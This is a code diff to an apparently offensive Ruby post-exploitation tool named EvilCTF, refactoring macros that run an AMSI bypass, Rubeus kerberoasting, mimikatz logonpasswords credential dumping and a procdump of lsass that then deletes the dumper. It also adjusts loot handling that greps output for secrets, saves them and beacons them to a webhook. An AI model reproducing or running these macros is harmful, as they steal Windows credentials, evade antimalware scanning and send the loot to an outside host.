@@ -160,15 +160,8 @@ module EvilCTF::Tools
       @aliases = { 'ls'=>'Get-ChildItem', 'whoami'=>'$env:USERNAME', 'pwd'=>'Get-Location', 'ps'=>'Get-Process' }
       @macros = {
         'kerberoast'     => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
-        'dump_creds'     => [
-          BYPASS_4MSI_PS,
-          "& \"C:\\Users\\Public\\mimikatz.exe\" \"privilege::debug\" \"log C:\\Users\\Public\\mimikatz.log\" \"sekurlsa::logonpasswords\" 2>$null"
-        ],
-        'lsass_dump'     => [
-          BYPASS_4MSI_PS,
-          "& \"C:\\Users\\Public\\procdump64.exe\" -accepteula -ma lsass C:\\Users\\Public\\lsass.dmp",
-          "Remove-Item \"C:\\Users\\Public\\procdump64.exe\""
-        ]
+        'dump_creds'     => [BYPASS_4MSI_PS, "& \"C:\\Users\\Public\\mimikatz.exe\" \"privilege::debug\" \"log C:\\Users\\Public\\mimikatz.log\" \"sekurlsa::logonpasswords\" 2>$null; exit"],
+        'lsass_dump'     => [BYPASS_4MSI_PS, "& \"C:\\Users\\Public\\procdump64.exe\" -accepteula -ma lsass C:\\Users\\Public\\lsass.dmp", "Remove-Item \"C:\\Users\\Public\\procdump64.exe\""]
       }
     end
 
@@ -187,10 +180,10 @@ module EvilCTF::Tools
       macro.each do |step|
         result = shell.run(step)
         puts result.output.strip
-        matches = grep_output(result.output)
+        matches = EvilCTF::Tools.grep_output(result.output)
         if matches.any?
-          save_loot(matches)
-          beacon_loot(webhook, matches) if webhook
+          EvilCTF::Tools.save_loot(matches)
+          EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
         end
       end
       true
@@ -469,4 +462,3 @@ module EvilCTF::Tools
     {}
   end
 end
-
